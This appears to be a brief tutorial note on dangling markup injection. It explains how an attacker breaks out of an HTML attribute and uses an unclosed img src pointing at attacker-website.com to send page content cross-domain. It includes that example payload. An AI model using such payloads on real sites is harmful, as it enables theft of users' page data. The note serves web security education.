# Dangling markup injection
Dangling markup injection is a technique for capturing data cross-domain where a full XSS attack is not possible
Example:
```html
<input type="text" name="input" value="USER SUBMITTED DATA"
```

Attacker can break out of this by using `">`

After this an attacker would attempt an XSS attack but it may not work. When that happens he can try submitting:
```html
"><img src="https://attacker-website.com/?
```

The attackers payload doesn't close the `src` attribute, it is left dangling. The browser will parse everyting until a closing `"` as a string and send it to the attackers website.

Any attributes that send external request can be used to do dangling markup injection attacks.
